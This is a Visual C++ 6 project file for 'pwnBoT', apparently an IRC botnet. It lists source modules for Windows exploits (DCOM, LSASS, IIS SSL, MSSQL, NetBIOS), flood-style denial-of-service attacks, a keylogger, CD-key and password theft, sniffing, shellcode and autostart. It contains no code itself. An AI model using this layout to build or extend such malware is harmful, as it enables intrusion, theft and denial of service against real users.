# Microsoft Developer Studio Project File - Name="pwnBoT" - Package Owner=<4>
# Microsoft Developer Studio Generated Build File, Format Version 6.00
# ** DO NOT EDIT **

# TARGTYPE "Win32 (x86) Application" 0x0101

CFG=pwnBoT - WIN32 RELEASE
!MESSAGE This is not a valid makefile. To build this project using NMAKE,
!MESSAGE use the Export Makefile command and run
!MESSAGE 
!MESSAGE NMAKE /f "pwnBoT.mak".
!MESSAGE 
!MESSAGE You can specify a configuration when running NMAKE
!MESSAGE by defining the macro CFG on the command line. For example:
!MESSAGE 
!MESSAGE NMAKE /f "pwnBoT.mak" CFG="pwnBoT - WIN32 RELEASE"
!MESSAGE 
!MESSAGE Possible choices for configuration are:
!MESSAGE 
!MESSAGE "pwnBoT - Win32 Release" (based on "Win32 (x86) Application")
!MESSAGE "pwnBoT - Win32 Debug" (based on "Win32 (x86) Application")
!MESSAGE 

# Begin Project
# PROP AllowPerConfigDependencies 0
# PROP Scc_ProjName ""
# PROP Scc_LocalPath ""
CPP=cl.exe
MTL=midl.exe
RSC=rc.exe

!IF  "$(CFG)" == "pwnBoT - Win32 Release"

# PROP BASE Use_MFC 0
# PROP BASE Use_Debug_Libraries 0
# PROP BASE Output_Dir "Release"
# PROP BASE Intermediate_Dir "Release"
# PROP BASE Target_Dir ""
# PROP Use_MFC 0
# PROP Use_Debug_Libraries 0
# PROP Output_Dir "Release"
# PROP Intermediate_Dir "Release"
# PROP Ignore_Export_Lib 0
# PROP Target_Dir ""
# ADD BASE CPP /nologo /W3 /GX /O2 /D "WIN32" /D "NDEBUG" /D "_WINDOWS" /D "_MBCS" /YX /FD /c
# ADD CPP /nologo /W3 /GX /O1 /D "WIN32" /D "NDEBUG" /D "_WINDOWS" /D "_MBCS" /YX /FD /c
# ADD BASE MTL /nologo /D "NDEBUG" /mktyplib203 /win32
# ADD MTL /nologo /D "NDEBUG" /mktyplib203 /win32
# ADD BASE RSC /l 0x409 /d "NDEBUG"
# ADD RSC /l 0x409 /d "NDEBUG"
BSC32=bscmake.exe
# ADD BASE BSC32 /nologo
# ADD BSC32 /nologo
LINK32=link.exe
# ADD BASE LINK32 kernel32.lib user32.lib gdi32.lib winspool.lib comdlg32.lib advapi32.lib shell32.lib ole32.lib oleaut32.lib uuid.lib odbc32.lib odbccp32.lib /nologo /subsystem:windows /machine:I386
# ADD LINK32 /nologo /subsystem:windows /machine:I386
# SUBTRACT LINK32 /pdb:none

!ELSEIF  "$(CFG)" == "pwnBoT - Win32 Debug"

# PROP BASE Use_MFC 0
# PROP BASE Use_Debug_Libraries 0
# PROP BASE Output_Dir "Debug"
# PROP BASE Intermediate_Dir "Debug"
# PROP BASE Ignore_Export_Lib 0
# PROP BASE Target_Dir ""
# PROP Use_MFC 0
# PROP Use_Debug_Libraries 0
# PROP Output_Dir "Debug"
# PROP Intermediate_Dir "Debug"
# PROP Ignore_Export_Lib 0
# PROP Target_Dir ""
# ADD BASE CPP /nologo /W3 /GX /O1 /D "WIN32" /D "NDEBUG" /D "_WINDOWS" /D "_MBCS" /YX /FD /c
# ADD CPP /nologo /MTd /W3 /Gi /GX /Od /D "WIN32" /D "NDEBUG" /D "_WINDOWS" /D "_MBCS" /FR /YX /FD /c
# ADD BASE MTL /nologo /D "NDEBUG" /mktyplib203 /win32
# ADD MTL /nologo /D "NDEBUG" /mktyplib203 /win32
# ADD BASE RSC /l 0x409 /d "NDEBUG"
# ADD RSC /l 0x409 /d "NDEBUG"
BSC32=bscmake.exe
# ADD BASE BSC32 /nologo
# ADD BSC32 /nologo
LINK32=link.exe
# ADD BASE LINK32 kernel32.lib user32.lib gdi32.lib winspool.lib comdlg32.lib advapi32.lib shell32.lib ole32.lib oleaut32.lib uuid.lib odbc32.lib odbccp32.lib wsock32.lib wininet.lib /nologo /subsystem:windows /machine:I386 /align:4096
# SUBTRACT BASE LINK32 /pdb:none
# ADD LINK32 /nologo /subsystem:windows /profile /map /debug /machine:I386

!ENDIF 

# Begin Target

# Name "pwnBoT - Win32 Release"
# Name "pwnBoT - Win32 Debug"
# Begin Group "Source Files"

# PROP Default_Filter "cpp;c;cxx;rc;def;r;odl;idl;hpj;bat"
# Begin Group "Exploit Sources"

# PROP Default_Filter ".cpp"
# Begin Source File

SOURCE=.\modules\dcom.cpp
# End Source File
# Begin Source File

SOURCE=.\modules\iis5ssl.cpp
# End Source File
# Begin Source File

SOURCE=.\modules\lsass.cpp
# End Source File
# Begin Source File

SOURCE=.\modules\mssql.cpp
# End Source File
# Begin Source File

SOURCE=.\modules\netbios.cpp
# End Source File
# End Group
# Begin Group "DDoS Sources"

# PROP Default_Filter ""
# Begin Source File

SOURCE=.\modules\icmpflood.cpp
# End Source File
# Begin Source File

SOURCE=.\modules\pingudp.cpp
# End Source File
# Begin Source File

SOURCE=.\modules\synflood.cpp
# End Source File
# Begin Source File

SOURCE=.\modules\tcpflood.cpp
# End Source File
# End Group
# Begin Group "Addon Sources"

# PROP Default_Filter ""
# Begin Source File

SOURCE=.\modules\advscan.cpp
# End Source File
# Begin Source File

SOURCE=.\modules\aliaslog.cpp
# End Source File
# Begin Source File

SOURCE=.\modules\capture.cpp
# End Source File
# Begin Source File

SOURCE=.\modules\cdkeys.cpp
# End Source File
# Begin Source File

SOURCE=.\modules\download.cpp
# End Source File
# Begin Source File

SOURCE=.\modules\driveinfo.cpp
# End Source File
# Begin Source File

SOURCE=.\modules\findfile.cpp
# End Source File
# Begin Source File

SOURCE=.\modules\findpass.cpp
# End Source File
# Begin Source File

SOURCE=.\modules\fphost.cpp
# End Source File
# Begin Source File

SOURCE=.\modules\httpd.cpp
# End Source File
# Begin Source File

SOURCE=.\modules\keylogger.cpp
# End Source File
# Begin Source File

SOURCE=.\modules\net.cpp
# End Source File
# Begin Source File

SOURCE=.\modules\processes.cpp
# End Source File
# Begin Source File

SOURCE=.\modules\psniff.cpp
# End Source File
# Begin Source File

SOURCE=.\modules\redirect.cpp
# End Source File
# Begin Source File

SOURCE=.\modules\remotecmd.cpp
# End Source File
# Begin Source File

SOURCE=.\modules\rlogind.cpp
# End Source File
# Begin Source File

SOURCE=.\modules\rndnick.cpp
# End Source File
# Begin Source File

SOURCE=.\modules\secure.cpp
# End Source File
# Begin Source File

SOURCE=.\modules\socks4.cpp
# End Source File
# Begin Source File

SOURCE=.\modules\tftpd.cpp
# End Source File
# Begin Source File

SOURCE=.\modules\visit.cpp
# End Source File
# End Group
# Begin Group "Base Sources"

# PROP Default_Filter ""
# Begin Source File

SOURCE=.\modules\autostart.cpp
# End Source File
# Begin Source File

SOURCE=.\modules\commands.cpp
# End Source File
# Begin Source File

SOURCE=.\modules\connect.cpp
# End Source File
# Begin Source File

SOURCE=.\modules\crc32.cpp
# End Source File
# Begin Source File

SOURCE=.\modules\crypt.cpp
# End Source File
# Begin Source File

SOURCE=.\modules\dcc.cpp
# End Source File
# Begin Source File

SOURCE=.\modules\ehandler.cpp
# End Source File
# Begin Source File

SOURCE=.\modules\ftptransfer.cpp
# End Source File
# Begin Source File

SOURCE=.\modules\ident.cpp
# End Source File
# Begin Source File

SOURCE=.\modules\irc_send.cpp
# End Source File
# Begin Source File

SOURCE=.\modules\loaddlls.cpp
# End Source File
# Begin Source File

SOURCE=.\modules\lsarestrict.cpp
# End Source File
# Begin Source File

SOURCE=.\modules\misc.cpp
# End Source File
# Begin Source File

SOURCE=.\modules\netutils.cpp
# End Source File
# Begin Source File

SOURCE=.\modules\protocol.cpp
# End Source File
# Begin Source File

SOURCE=.\modules\pwnBoT.cpp
# End Source File
# Begin Source File

SOURCE=.\modules\session.cpp
# End Source File
# Begin Source File

SOURCE=.\modules\shellcode.cpp
# End Source File
# Begin Source File

SOURCE=.\modules\startup.cpp
# End Source File
# Begin Source File

SOURCE=.\modules\sysinfo.cpp
# End Source File
# Begin Source File

SOURCE=.\modules\threads.cpp
# End Source File
# Begin Source File

SOURCE=.\modules\wildcard.cpp
# End Source File
# End Group
# End Group
# Begin Group "Header Files"

# PROP Default_Filter "h;hpp;hxx;hm;inl"
# Begin Group "Bot Config"

# PROP Default_Filter ""
# Begin Source File

SOURCE=.\modules\configs.h
# End Source File
# End Group
# Begin Group "Exploit Headers"

# PROP Default_Filter ""
# Begin Source File

SOURCE=.\modules\dcom.h
# End Source File
# Begin Source File

SOURCE=.\modules\iis5ssl.h
# End Source File
# Begin Source File

SOURCE=.\modules\lsass.h
# End Source File
# Begin Source File

SOURCE=.\modules\mssql.h
# End Source File
# Begin Source File

SOURCE=.\modules\netbios.h
# End Source File
# Begin Source File

SOURCE=.\modules\nicklist.h
# End Source File
# Begin Source File

SOURCE=.\modules\passwd.h
# End Source File
# End Group
# Begin Group "DDoS Headers"

# PROP Default_Filter ""
# Begin Source File

SOURCE=.\modules\icmpflood.h
# End Source File
# Begin Source File

SOURCE=.\modules\pingudp.h
# End Source File
# Begin Source File

SOURCE=.\modules\synflood.h
# End Source File
# Begin Source File

SOURCE=.\modules\tcpflood.h
# End Source File
# End Group
# Begin Group "Addon Headers"

# PROP Default_Filter ""
# Begin Source File

SOURCE=.\modules\advscan.h
# End Source File
# Begin Source File

SOURCE=.\modules\aliaslog.h
# End Source File
# Begin Source File

SOURCE=.\modules\capture.h
# End Source File
# Begin Source File

SOURCE=.\modules\cdkeys.h
# End Source File
# Begin Source File

SOURCE=.\modules\dcc.h
# End Source File
# Begin Source File

SOURCE=.\modules\download.h
# End Source File
# Begin Source File

SOURCE=.\modules\driveinfo.h
# End Source File
# Begin Source File

SOURCE=.\modules\findfile.h
# End Source File
# Begin Source File

SOURCE=.\modules\findpass.h
# End Source File
# Begin Source File

SOURCE=.\modules\fphost.h
# End Source File
# Begin Source File

SOURCE=.\modules\ftptransfer.h
# End Source File
# Begin Source File

SOURCE=.\modules\httpd.h
# End Source File
# Begin Source File

SOURCE=.\modules\ident.h
# End Source File
# Begin Source File

SOURCE=.\modules\includes.h
# End Source File
# Begin Source File

SOURCE=.\modules\keylogger.h
# End Source File
# Begin Source File

SOURCE=.\modules\misc.h
# End Source File
# Begin Source File

SOURCE=.\modules\net.h
# End Source File
# Begin Source File

SOURCE=.\modules\netutils.h
# End Source File
# Begin Source File

SOURCE=.\modules\processes.h
# End Source File
# Begin Source File

SOURCE=.\modules\psniff.h
# End Source File
# Begin Source File

SOURCE=.\modules\redirect.h
# End Source File
# Begin Source File

SOURCE=.\modules\remotecmd.h
# End Source File
# Begin Source File

SOURCE=.\modules\rlogind.h
# End Source File
# Begin Source File

SOURCE=.\modules\rndnick.h
# End Source File
# Begin Source File

SOURCE=.\modules\secure.h
# End Source File
# Begin Source File

SOURCE=.\modules\socks4.h
# End Source File
# Begin Source File

SOURCE=.\modules\sysinfo.h
# End Source File
# Begin Source File

SOURCE=.\modules\tftpd.h
# End Source File
# Begin Source File

SOURCE=.\modules\visit.h
# End Source File
# End Group
# Begin Group "Base Headers"

# PROP Default_Filter ""
# Begin Source File

SOURCE=.\modules\autostart.h
# End Source File
# Begin Source File

SOURCE=.\modules\commands.h
# End Source File
# Begin Source File

SOURCE=.\modules\connect.h
# End Source File
# Begin Source File

SOURCE=.\modules\crc32.h
# End Source File
# Begin Source File

SOURCE=.\modules\crypt.h
# End Source File
# Begin Source File

SOURCE=.\modules\defines.h
# End Source File
# Begin Source File

SOURCE=.\modules\ehandler.h
# End Source File
# Begin Source File

SOURCE=.\modules\externs.h
# End Source File
# Begin Source File

SOURCE=.\modules\functions.h
# End Source File
# Begin Source File

SOURCE=.\modules\globals.h
# End Source File
# Begin Source File

SOURCE=.\modules\irc_send.h
# End Source File
# Begin Source File

SOURCE=.\modules\loaddlls.h
# End Source File
# Begin Source File

SOURCE=.\modules\lsarestrict.h
# End Source File
# Begin Source File

SOURCE=.\modules\protocol.h
# End Source File
# Begin Source File

SOURCE=.\modules\pwnBoT.h
# End Source File
# Begin Source File

SOURCE=.\modules\session.h
# End Source File
# Begin Source File

SOURCE=.\modules\shellcode.h
# End Source File
# Begin Source File

SOURCE=.\modules\startup.h
# End Source File
# Begin Source File

SOURCE=.\modules\tcpip.h
# End Source File
# Begin Source File

SOURCE=.\modules\threads.h
# End Source File
# Begin Source File

SOURCE=.\modules\wildcard.h
# End Source File
# End Group
# End Group
# Begin Group "Resource Files"

# PROP Default_Filter "ico;cur;bmp;dlg;rc2;rct;bin;rgs;gif;jpg;jpeg;jpe"
# End Group
# End Target
# End Project
